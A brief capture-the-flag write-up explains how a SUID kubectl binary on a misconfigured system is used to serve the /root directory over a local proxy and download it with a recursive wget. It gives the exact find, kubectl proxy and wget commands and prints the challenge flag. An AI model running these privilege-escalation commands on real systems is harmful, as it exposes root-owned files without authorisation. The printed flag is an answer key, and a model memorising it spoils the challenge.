# GTFOBins - 2
Category: GTFObins

## Description
We've gotten you access to a misconfigured system!

Can you figure out how to leak the flag?

## Write-up
- To find SUID binaries, the command `find / -perm -u=s -type f 2>/dev/null` can be used. In this particular case, the binary `kubectl` was found with sticky bits set.
- `kubectl` can be used to set up a proxy server that serves files from the `/root` directory to anyone who accesses it. The command to execute is `./kubectl proxy --address=127.0.0.1 --port=1234 --www=/root --www-prefix=/x/.`
- On another machine instance, the files can be retrieved using `wget` with the command `wget --no-parent -r http://localhost:1234/x/`. This will recursively retrieve all files from the proxy server.
- The flag was discovered within one of the retrieved files.

Flag: `punk_{8K68JXCE4E0DM5WW}`
